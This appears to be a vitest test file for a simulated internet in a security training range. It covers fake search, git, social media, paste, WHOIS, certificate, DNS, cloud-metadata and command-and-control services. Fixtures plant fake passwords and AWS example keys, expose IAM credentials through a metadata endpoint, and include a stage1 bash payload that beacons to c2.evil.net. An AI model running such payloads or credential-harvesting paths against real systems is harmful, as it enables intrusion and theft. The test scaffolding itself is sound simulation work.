/**
 * VARIANT — Variant Internet Module Tests
 *
 * Tests for the dramatically expanded internet simulation:
 * search engine, git repos, social media, paste sites,
 * WHOIS, cert transparency, API services, cloud metadata, C2.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { createVariantInternet } from '../../src/modules/variant-internet';
import type { ExternalRequest, ExternalServiceHandler } from '../../src/core/fabric/types';
import type {
    VariantInternetSpec,
    VariantInternetService,
    GitRepoSpec,
    SocialProfileSpec,
    PasteSiteSpec,
    WhoisRecordSpec,
    CertTransparencyRecord,
} from '../../src/core/world/types';

// ── Helpers ────────────────────────────────────────────────────

const decoder = new TextDecoder();

function makeRequest(
    method: string,
    path: string,
    headers?: Record<string, string>,
    body?: string | Uint8Array | null,
): ExternalRequest {
    const headerMap = new Map<string, string>();
    if (headers) {
        for (const [k, v] of Object.entries(headers)) {
            headerMap.set(k, v);
        }
    }
    let requestBody: Uint8Array | null = null;
    if (typeof body === 'string') {
        requestBody = new TextEncoder().encode(body);
    } else if (body instanceof Uint8Array) {
        requestBody = body;
    } else if (body === null) {
        requestBody = null;
    }
    return { method, path, headers: headerMap, body: requestBody };
}

function responseText(handler: ExternalServiceHandler, req: ExternalRequest): string {
    const res = handler.handleRequest(req);
    return decoder.decode(res.body);
}

function responseStatus(handler: ExternalServiceHandler, req: ExternalRequest): number {
    return handler.handleRequest(req).status;
}

function createMockContext(spec: VariantInternetSpec) {
    const registeredHandlers: ExternalServiceHandler[] = [];
    const registeredDNS: Array<{ domain: string; ip: string; type: string; ttl: number }> = [];
    const emittedEvents: Array<{ type: string; source?: string; message?: string; timestamp: number }> = [];

    const context = {
        world: {
            variantInternet: spec,
        } as any,
        fabric: {
            addDNSRecord(record: { domain: string; ip: string; type: string; ttl: number }) {
                registeredDNS.push(record);
            },
            registerExternal(handler: ExternalServiceHandler) {
                registeredHandlers.push(handler);
            },
        } as any,
        events: {
            emit(event: any) {
                emittedEvents.push(event);
            },
        } as any,
        vms: new Map(),
        tick: 0,
        services: {} as any,
    };

    return { context, registeredHandlers, registeredDNS, emittedEvents };
}

function findHandler(handlers: ExternalServiceHandler[], domain: string): ExternalServiceHandler | undefined {
    return handlers.find(h => h.domain === domain);
}

// ── Spec fixtures ──────────────────────────────────────────────

function makeSearchService(): VariantInternetService {
    return {
        domain: 'search.variant.net',
        type: 'search',
        searchConfig: {
            engineName: 'VSearch',
            results: {
                'admin password': [
                    { title: 'Default Credentials List', url: 'https://paste.variant.net/abc123', snippet: 'Common default passwords for admin accounts' },
                    { title: 'Corp IT Wiki', url: 'https://wiki.corp.local/passwords', snippet: 'Internal credential management policy' },
                ],
                'web-01 ssh': [
                    { title: 'Server Documentation', url: 'https://docs.corp.local/servers', snippet: 'SSH access configuration for web-01' },
                ],
                'incident report': [
                    { title: 'Incident Report Q4', url: 'https://docs.corp.local/reports/q4-incident.pdf', snippet: 'SOC incident report and remediation timeline' },
                    { title: 'Incident Notes', url: 'https://wiki.corp.local/incident-notes', snippet: 'Internal notes and ticket references' },
                ],
            },
            defaultResults: [
                { title: 'VARIANT Documentation', url: 'https://docs.variant.net', snippet: 'Official documentation' },
            ],
        },
    };
}

function makeGitRepo(): GitRepoSpec {
    return {
        domain: 'git.corp.local',
        path: '/corp/webapp.git',
        name: 'webapp',
        description: 'Internal web application',
        public: true,
        branches: ['main', 'develop'],
        files: {
            'README.md': { content: '# Webapp\nInternal web application.' },
            'config/database.yml': { content: 'production:\n  host: db-01\n  password: s3cret_db_p4ss\n  database: appdb' },
            'src/app.py': { content: 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef index():\n    return "Hello World"' },
            '.env.example': { content: 'DATABASE_URL=postgresql://user:password@localhost/db\nSECRET_KEY=changeme\nAWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE' },
        },
        commits: [
            { hash: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', author: 'admin', email: 'admin@corp.local', message: 'Update database config', timestamp: 1700000000000, changedFiles: ['config/database.yml'] },
            { hash: 'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3', author: 'dev', email: 'dev@corp.local', message: 'Initial commit', timestamp: 1699900000000 },
        ],
    };
}

function makeSocialProfile(): SocialProfileSpec {
    return {
        domain: 'social.variant.net',
        profilePath: '/@admin',
        displayName: 'Admin User',
        username: 'admin',
        bio: 'System administrator at Corp Inc. Love coffee and bash scripts.',
        links: ['https://git.corp.local/@admin', 'admin@corp.local'],
        metadata: { 'Joined': '2023-01-15', 'Location': 'Building 3, Floor 2' },
        posts: [
            { id: 'post-1', content: 'Just reset the password on web-01 to Summer2024!', timestamp: 1700100000000, sensitive: true },
            { id: 'post-2', content: 'New security policy meeting at 3pm tomorrow.', timestamp: 1700000000000, mentions: ['@security-team'] },
        ],
    };
}

function makePasteSite(): PasteSiteSpec {
    return {
        domain: 'paste.variant.net',
        pastes: [
            {
                id: 'abc123',
                title: 'Server Config Backup',
                author: 'admin',
                content: '# SSH Config\nHost web-01\n  User admin\n  IdentityFile ~/.ssh/id_rsa\n  Port 2222\n\nHost db-01\n  User root\n  Password: r00tP4ss!',
                language: 'text',
                timestamp: 1700050000000,
                indexed: true,
            },
            {
                id: 'def456',
                title: 'API Keys',
                author: 'anonymous',
                content: 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
                language: 'env',
                timestamp: 1700060000000,
                indexed: true,
            },
        ],
    };
}

function makeWhoisRecord(): WhoisRecordSpec {
    return {
        domain: 'corp.local',
        registrant: 'Corp Inc.',
        registrantEmail: 'admin@corp.local',
        registrar: 'VARIANT Registrar',
        createdDate: '2020-01-15',
        updatedDate: '2024-06-01',
        expiresDate: '2025-01-15',
        nameservers: ['ns1.corp.local', 'ns2.corp.local'],
        status: 'active',
    };
}

function makeCertRecord(): CertTransparencyRecord {
    return {
        domain: '*.corp.local',
        issuer: 'VARIANT CA',
        validFrom: '2024-01-01',
        validTo: '2025-01-01',
        serialNumber: '0A:1B:2C:3D:4E:5F',
        subjectAltNames: ['corp.local', 'www.corp.local', 'git.corp.local', 'mail.corp.local', 'admin.corp.local', 'staging.corp.local'],
    };
}

function makeFullSpec(): VariantInternetSpec {
    return {
        services: [
            makeSearchService(),
            {
                domain: 'api.corp.local',
                type: 'api',
                apiConfig: {
                    routes: {
                        'GET /api/users': {
                            status: 200,
                            contentType: 'application/json',
                            body: JSON.stringify([{ id: 1, name: 'admin' }, { id: 2, name: 'user' }]),
                        },
                        'GET /api/health': {
                            status: 200,
                            contentType: 'application/json',
                            body: '{"status":"ok"}',
                        },
                        'POST /api/login': {
                            status: 200,
                            contentType: 'application/json',
                            body: '{"token":"eyJ..."}',
                        },
                        'POST /api/echo': {
                            status: 200,
                            contentType: 'application/json',
                            body: '{"echo": {{request.body}}}',
                        },
                    },
                    requiresAuth: false,
                },
            },
            {
                domain: 'metadata.internal',
                type: 'cloud-metadata',
            },
            {
                domain: 'c2.evil.net',
                type: 'c2',
                staticContent: {
                    '/payload/stage1': '#!/bin/bash\ncurl -s http://c2.evil.net/beacon',
                },
            },
            {
                domain: 'forum.corp.local',
                type: 'forum',
                staticContent: {
                    '/': '<html><body><h1>Corp Forum</h1><ul><li><a href="/thread/1">VPN Issues</a></li></ul></body></html>',
                    '/thread/1': '<html><body><h1>VPN Issues</h1><p>Has anyone else had trouble connecting to the VPN? Try using the backup gateway at 10.0.3.1</p></body></html>',
                },
            },
            {
                domain: 'www.corp.local',
                type: 'website',
                staticContent: {
                    '/': '<html><body><h1>Corp Inc.</h1><p>Welcome to our company.</p></body></html>',
                    '/about': '<html><body><h1>About Us</h1></body></html>',
                    '/robots.txt': 'User-agent: *\nDisallow: /admin\nDisallow: /backup',
                },
            },
        ],
        dnsRecords: [
            { domain: 'corp.local', ip: '10.0.1.1' },
            { domain: 'www.corp.local', ip: '10.0.1.10' },
        ],
        gitRepos: [makeGitRepo()],
        socialProfiles: [makeSocialProfile()],
        pasteSites: [makePasteSite()],
        whoisRecords: [makeWhoisRecord()],
        certRecords: [makeCertRecord()],
    };
}

// ── Tests ──────────────────────────────────────────────────────

describe('createVariantInternet', () => {
    it('creates a module with correct metadata', () => {
        const mod = createVariantInternet();
        expect(mod.id).toBe('variant-internet');
        expect(mod.type).toBe('engine');
        expect(mod.version).toBe('2.0.0');
    });

    it('does nothing when variantInternet is undefined', () => {
        const mod = createVariantInternet();
        const { context, registeredHandlers, registeredDNS } = createMockContext(undefined as any);
        context.world.variantInternet = undefined;
        mod.init(context);
        expect(registeredHandlers.length).toBe(0);
        expect(registeredDNS.length).toBe(0);
    });
});

describe('Module init', () => {
    it('registers DNS records and service handlers', () => {
        const spec = makeFullSpec();
        const { context, registeredHandlers, registeredDNS, emittedEvents } = createMockContext(spec);
        const mod = createVariantInternet();
        mod.init(context);

        // DNS records: 2 explicit + services + git domains + social domains + paste domains
        expect(registeredDNS.length).toBeGreaterThan(5);

        // Handlers: 6 services + 1 git domain + 1 social domain + 1 paste domain
        expect(registeredHandlers.length).toBeGreaterThan(6);

        // Activation event
        expect(emittedEvents.length).toBe(1);
        expect(emittedEvents[0]!.type).toBe('sim:alert');
        const msg = (emittedEvents[0] as any).message;
        expect(msg).toContain('6 services');
        expect(msg).toContain('1 repos');
        expect(msg).toContain('1 profiles');
    });
});

describe('Search engine', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'search.variant.net')!;
    });

    it('renders search form on root', () => {
        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('VSearch');
        expect(text).toContain('<form');
    });

    it('returns configured results for exact query', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q=admin+password'));
        expect(text).toContain('Default Credentials List');
        expect(text).toContain('Corp IT Wiki');
        expect(text).toContain('2 results');
        expect(text).toContain('Cached');
    });

    it('returns configured results case-insensitive', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q=ADMIN+PASSWORD'));
        expect(text).toContain('Default Credentials List');
    });

    it('returns partial-match results', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q=admin'));
        expect(text).toContain('Default Credentials List');
    });

    it('returns default results for unknown query', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q=xyznotfound'));
        expect(text).toContain('VARIANT Documentation');
    });

    it('shows empty state when no results and no defaults', () => {
        const spec: VariantInternetSpec = {
            services: [{
                domain: 'search.test',
                type: 'search',
                searchConfig: { results: {} },
            }],
            dnsRecords: [],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const h = findHandler(registeredHandlers, 'search.test')!;
        const text = responseText(h, makeRequest('GET', '/search?q=anything'));
        expect(text).toContain('No results found');
    });

    it('prompts when query is empty', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q='));
        expect(text).toContain('Enter a search query');
    });

    it('supports site: operator filtering', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q=admin+password+site:wiki.corp.local'));
        expect(text).toContain('Corp IT Wiki');
        expect(text).not.toContain('Default Credentials List');
    });

    it('supports filetype:pdf operator filtering', () => {
        const text = responseText(handler, makeRequest('GET', '/search?q=incident+report+filetype:pdf'));
        expect(text).toContain('Incident Report Q4');
        expect(text).not.toContain('Incident Notes');
        expect(text).toContain('q4-incident.pdf');
    });
});

describe('Cloud metadata', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'metadata.internal')!;
    });

    it('returns instance metadata', () => {
        const text = responseText(handler, makeRequest('GET', '/latest/meta-data/instance-id'));
        expect(text).toBe('i-0abc123def456789');
    });

    it('returns IAM credentials', () => {
        const text = responseText(handler, makeRequest('GET', '/latest/meta-data/iam/security-credentials/admin-role'));
        const parsed = JSON.parse(text);
        expect(parsed.AccessKeyId).toBe('AKIAIOSFODNN7EXAMPLE');
        expect(parsed.SecretAccessKey).toBe('wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
    });

    it('returns user-data with secrets', () => {
        const text = responseText(handler, makeRequest('GET', '/latest/user-data'));
        expect(text).toContain('DB_PASSWORD="s3cret_db_p4ss"');
    });

    it('returns instance identity document', () => {
        const text = responseText(handler, makeRequest('GET', '/latest/dynamic/instance-identity/document'));
        const parsed = JSON.parse(text);
        expect(parsed.accountId).toBe('123456789012');
        expect(parsed.region).toBe('us-east-1');
    });

    it('returns IMDSv2 token', () => {
        const res = handler.handleRequest(makeRequest('PUT', '/latest/api/token'));
        expect(res.status).toBe(200);
    });

    it('returns metadata directory listing', () => {
        const text = responseText(handler, makeRequest('GET', '/latest/meta-data/'));
        expect(text).toContain('instance-id');
        expect(text).toContain('iam/');
    });

    it('returns 404 for unknown paths', () => {
        expect(responseStatus(handler, makeRequest('GET', '/latest/meta-data/nonexistent'))).toBe(404);
    });
});

describe('API service', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'api.corp.local')!;
    });

    it('returns configured route response', () => {
        const text = responseText(handler, makeRequest('GET', '/api/users'));
        const parsed = JSON.parse(text);
        expect(parsed).toHaveLength(2);
        expect(parsed[0].name).toBe('admin');
    });

    it('returns health endpoint', () => {
        const text = responseText(handler, makeRequest('GET', '/api/health'));
        expect(JSON.parse(text).status).toBe('ok');
    });

    it('handles POST routes', () => {
        const res = handler.handleRequest(makeRequest('POST', '/api/login'));
        expect(res.status).toBe(200);
        const parsed = JSON.parse(decoder.decode(res.body));
        expect(parsed.token).toBeDefined();
    });

    it('returns 404 for unknown API paths', () => {
        const res = handler.handleRequest(makeRequest('GET', '/api/unknown'));
        expect(res.status).toBe(404);
    });

    it('enforces auth when required', () => {
        const spec: VariantInternetSpec = {
            services: [{
                domain: 'secure-api.test',
                type: 'api',
                apiConfig: {
                    routes: { 'GET /data': { status: 200, contentType: 'application/json', body: '{"secret":"value"}' } },
                    requiresAuth: true,
                    authToken: 'secret-token',
                },
            }],
            dnsRecords: [],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const h = findHandler(registeredHandlers, 'secure-api.test')!;

        // No auth header → 401
        expect(responseStatus(h, makeRequest('GET', '/data'))).toBe(401);

        // Wrong token → 403
        expect(responseStatus(h, makeRequest('GET', '/data', { authorization: 'Bearer wrong' }))).toBe(403);

        // Correct token → 200
        expect(responseStatus(h, makeRequest('GET', '/data', { authorization: 'Bearer secret-token' }))).toBe(200);
    });

    it('parses JSON request body for POST routes', () => {
        const text = responseText(
            handler,
            makeRequest(
                'POST',
                '/api/echo',
                { 'content-type': 'application/json' },
                JSON.stringify({ op: 'ping', token: 'abc123' }),
            ),
        );
        const parsed = JSON.parse(text);
        expect(parsed.echo.op).toBe('ping');
        expect(parsed.echo.token).toBe('abc123');
    });

    it('supports API version prefixes for existing routes', () => {
        const text = responseText(handler, makeRequest('GET', '/v1/api/users'));
        const parsed = JSON.parse(text);
        expect(parsed).toHaveLength(2);
    });

    it('adds CORS headers on API responses', () => {
        const res = handler.handleRequest(makeRequest('GET', '/api/health'));
        expect(res.headers.get('access-control-allow-origin')).toBe('*');
        expect(res.headers.get('access-control-allow-methods')).toContain('GET');
    });

    it('simulates rate limiting with 429 responses', () => {
        let lastStatus = 200;
        for (let i = 0; i < 13; i++) {
            const res = handler.handleRequest(makeRequest('GET', '/api/health', { 'x-forwarded-for': '198.51.100.22' }));
            lastStatus = res.status;
        }
        expect(lastStatus).toBe(429);
    });
});

describe('Git repository', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'git.corp.local')!;
    });

    it('shows repository index', () => {
        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('webapp');
        expect(text).toContain('Internal web application');
    });

    it('shows repo file listing', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git'));
        expect(text).toContain('README.md');
        expect(text).toContain('config/database.yml');
        expect(text).toContain('src/app.py');
    });

    it('shows file content via blob path', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/blob/main/config/database.yml'));
        expect(text).toContain('s3cret_db_p4ss');
    });

    it('returns raw file content', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/raw/main/README.md'));
        expect(text).toBe('# Webapp\nInternal web application.');
    });

    it('shows commit log', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/commits'));
        expect(text).toContain('Update database config');
        expect(text).toContain('a1b2c3d');
        expect(text).toContain('Initial commit');
    });

    it('returns git info/refs for clone', () => {
        const res = handler.handleRequest(makeRequest('GET', '/corp/webapp.git/info/refs'));
        expect(res.status).toBe(200);
        const text = decoder.decode(res.body);
        expect(text).toContain('refs/heads/main');
    });

    it('shows .env.example with secrets', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/blob/main/.env.example'));
        expect(text).toContain('AKIAIOSFODNN7EXAMPLE');
    });

    it('returns 404 for nonexistent file', () => {
        expect(responseStatus(handler, makeRequest('GET', '/corp/webapp.git/blob/main/nonexistent'))).toBe(404);
    });

    it('exposes commit detail endpoint with diff', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/commits/a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2'));
        expect(text).toContain('Author: admin');
        expect(text).toContain('diff --git');
        expect(text).toContain('config/database.yml');
    });

    it('lists repository branches', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/branches'));
        expect(text).toContain('main');
        expect(text).toContain('develop');
    });

    it('lists repository tags', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/tags'));
        expect(text).toContain('v');
        expect(text).toContain('Update database config');
    });

    it('shows blame attribution for file lines', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/blame/config/database.yml'));
        expect(text).toContain('(admin');
        expect(text).toContain('password: s3cret_db_p4ss');
    });

    it('leaks .git/config content', () => {
        const text = responseText(handler, makeRequest('GET', '/corp/webapp.git/.git/config'));
        expect(text).toContain('[remote \"origin\"]');
        expect(text).toContain('https://git.corp.local/corp/webapp.git');
        expect(text).toContain('admin@corp.local');
    });
});

describe('Social media', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'social.variant.net')!;
    });

    it('shows social feed', () => {
        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('Social Feed');
        expect(text).toContain('Admin User');
    });

    it('shows profile page', () => {
        const text = responseText(handler, makeRequest('GET', '/@admin'));
        expect(text).toContain('Admin User');
        expect(text).toContain('System administrator');
        expect(text).toContain('Building 3, Floor 2');
    });

    it('shows sensitive post with password leak', () => {
        const text = responseText(handler, makeRequest('GET', '/@admin'));
        expect(text).toContain('Summer2024!');
    });

    it('shows profile links', () => {
        const text = responseText(handler, makeRequest('GET', '/@admin'));
        expect(text).toContain('git.corp.local');
        expect(text).toContain('admin@corp.local');
    });

    it('shows individual post', () => {
        const text = responseText(handler, makeRequest('GET', '/@admin/post/post-1'));
        expect(text).toContain('Summer2024!');
    });

    it('search API finds profiles', () => {
        const text = responseText(handler, makeRequest('GET', '/api/users/search?q=admin'));
        const parsed = JSON.parse(text);
        expect(parsed.results).toHaveLength(1);
        expect(parsed.results[0].username).toBe('admin');
    });

    it('search API returns empty for no match', () => {
        const text = responseText(handler, makeRequest('GET', '/api/users/search?q=nonexistent'));
        const parsed = JSON.parse(text);
        expect(parsed.results).toHaveLength(0);
    });

    it('exposes direct messages API with potentially sensitive content', () => {
        const text = responseText(handler, makeRequest('GET', '/api/messages/admin'));
        const parsed = JSON.parse(text);
        expect(parsed.userId).toBe('admin');
        expect(parsed.directMessages.length).toBeGreaterThan(1);
        expect(JSON.stringify(parsed.directMessages)).toContain('VPN recovery code');
    });

    it('exposes social graph API for OSINT', () => {
        const text = responseText(handler, makeRequest('GET', '/api/connections/admin'));
        const parsed = JSON.parse(text);
        expect(parsed.userId).toBe('admin');
        expect(parsed.connections.length).toBeGreaterThan(0);
        expect(parsed.connections.some((c: { target: string }) => c.target === 'security-team')).toBe(true);
    });

    it('embeds metadata tags in profile HTML', () => {
        const text = responseText(handler, makeRequest('GET', '/@admin'));
        expect(text).toContain('property="profile:username"');
        expect(text).toContain('application/ld+json');
    });
});

describe('Paste site', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'paste.variant.net')!;
    });

    it('shows paste index', () => {
        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('Server Config Backup');
        expect(text).toContain('API Keys');
    });

    it('shows individual paste', () => {
        const text = responseText(handler, makeRequest('GET', '/abc123'));
        expect(text).toContain('Server Config Backup');
        expect(text).toContain('r00tP4ss!');
    });

    it('shows paste with leaked API keys', () => {
        const text = responseText(handler, makeRequest('GET', '/def456'));
        expect(text).toContain('AKIAIOSFODNN7EXAMPLE');
    });

    it('returns raw paste content', () => {
        const text = responseText(handler, makeRequest('GET', '/raw/abc123'));
        expect(text).toContain('Host web-01');
        expect(text).toContain('r00tP4ss!');
        // Raw should not contain HTML
        expect(text).not.toContain('<html');
    });

    it('supports /paste/ prefix path', () => {
        const text = responseText(handler, makeRequest('GET', '/paste/abc123'));
        expect(text).toContain('Server Config Backup');
    });

    it('has API endpoint', () => {
        const text = responseText(handler, makeRequest('GET', '/api/pastes'));
        const parsed = JSON.parse(text);
        expect(parsed).toHaveLength(2);
        expect(parsed[0].id).toBe('abc123');
    });
});

describe('WHOIS', () => {
    it('returns WHOIS record for known domain', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'whois.variant.net', type: 'whois' }],
            dnsRecords: [],
            whoisRecords: [makeWhoisRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'whois.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/lookup/corp.local'));
        expect(text).toContain('CORP.LOCAL');
        expect(text).toContain('Corp Inc.');
        expect(text).toContain('admin@corp.local');
        expect(text).toContain('ns1.corp.local');
    });

    it('returns no-match for unknown domain', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'whois.variant.net', type: 'whois' }],
            dnsRecords: [],
            whoisRecords: [makeWhoisRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'whois.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/lookup/unknown.com'));
        expect(text).toContain('No match');
    });

    it('returns JSON when accept header is json', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'whois.variant.net', type: 'whois' }],
            dnsRecords: [],
            whoisRecords: [makeWhoisRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'whois.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/lookup/corp.local', { accept: 'application/json' }));
        const parsed = JSON.parse(text);
        expect(parsed.domain).toBe('corp.local');
        expect(parsed.registrant).toBe('Corp Inc.');
    });

    it('shows lookup form on root', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'whois.variant.net', type: 'whois' }],
            dnsRecords: [],
            whoisRecords: [],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'whois.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/'));
        expect(text).toContain('WHOIS Lookup');
        expect(text).toContain('<form');
    });
});

describe('Certificate transparency', () => {
    it('finds certificates by domain', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'ct.variant.net', type: 'cert-transparency' }],
            dnsRecords: [],
            certRecords: [makeCertRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'ct.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/search/corp.local'));
        expect(text).toContain('*.corp.local');
        expect(text).toContain('staging.corp.local');
        expect(text).toContain('admin.corp.local');
        expect(text).toContain('VARIANT CA');
    });

    it('returns JSON via API endpoint', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'ct.variant.net', type: 'cert-transparency' }],
            dnsRecords: [],
            certRecords: [makeCertRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'ct.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/api/search?domain=corp.local'));
        const parsed = JSON.parse(text);
        expect(parsed.results).toHaveLength(1);
        expect(parsed.results[0].subjectAltNames).toContain('staging.corp.local');
    });

    it('returns no results for unknown domain', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'ct.variant.net', type: 'cert-transparency' }],
            dnsRecords: [],
            certRecords: [makeCertRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'ct.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/search/unknown.com'));
        expect(text).toContain('No certificates found');
    });

    it('supports wildcard domain search via /api/domains', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'ct.variant.net', type: 'cert-transparency' }],
            dnsRecords: [],
            certRecords: [makeCertRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'ct.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/api/domains?q=*.corp.local'));
        const parsed = JSON.parse(text);
        expect(parsed.domains).toContain('git.corp.local');
        expect(parsed.certificates).toHaveLength(1);
    });

    it('includes certificate chain details in API responses', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'ct.variant.net', type: 'cert-transparency' }],
            dnsRecords: [],
            certRecords: [makeCertRecord()],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'ct.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/api/search?domain=corp.local'));
        const parsed = JSON.parse(text);
        expect(parsed.results[0].chain).toHaveLength(3);
        expect(parsed.results[0].chain[0].issuer).toBe('VARIANT CA');
    });
});

describe('DNS lookup service', () => {
    it('returns DNS records for queried domain', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'dns.variant.net', type: 'dns-lookup' }],
            dnsRecords: [
                { domain: 'corp.local', ip: '10.0.1.1' },
                { domain: 'www.corp.local', ip: '10.0.1.10' },
                { domain: 'mail.corp.local', ip: '10.0.1.20', type: 'MX', value: 'mail.corp.local' },
            ],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'dns.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/lookup/corp.local'));
        expect(text).toContain('corp.local');
        expect(text).toContain('10.0.1.1');
    });

    it('returns NXDOMAIN for unknown domains', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'dns.variant.net', type: 'dns-lookup' }],
            dnsRecords: [{ domain: 'corp.local', ip: '10.0.1.1' }],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'dns.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/lookup/unknown.com'));
        expect(text).toContain('NXDOMAIN');
    });

    it('returns JSON via accept header', () => {
        const spec: VariantInternetSpec = {
            services: [{ domain: 'dns.variant.net', type: 'dns-lookup' }],
            dnsRecords: [{ domain: 'corp.local', ip: '10.0.1.1' }],
        };
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        const handler = findHandler(registeredHandlers, 'dns.variant.net')!;

        const text = responseText(handler, makeRequest('GET', '/lookup/corp.local', { accept: 'application/json' }));
        const parsed = JSON.parse(text);
        expect(parsed.records).toHaveLength(1);
    });
});

describe('C2 server', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'c2.evil.net')!;
    });

    it('handles registration', () => {
        const text = responseText(handler, makeRequest('POST', '/register'));
        const parsed = JSON.parse(text);
        expect(parsed.status).toBe('registered');
        expect(parsed.id).toMatch(/^agent-/);
    });

    it('handles beacon check-in', () => {
        const text = responseText(handler, makeRequest('GET', '/beacon'));
        const parsed = JSON.parse(text);
        expect(parsed.status).toBe('ok');
    });

    it('serves payload', () => {
        const text = responseText(handler, makeRequest('GET', '/payload/stage1'));
        expect(text).toContain('#!/bin/bash');
    });

    it('returns empty HTML for unknown paths (blend in)', () => {
        const res = handler.handleRequest(makeRequest('GET', '/unknown'));
        expect(res.status).toBe(200);
    });
});

describe('Website', () => {
    let handler: ExternalServiceHandler;

    beforeEach(() => {
        const spec = makeFullSpec();
        const { context, registeredHandlers } = createMockContext(spec);
        createVariantInternet().init(context);
        handler = findHandler(registeredHandlers, 'www.corp.local')!;
    });

    it('serves root page', () => {
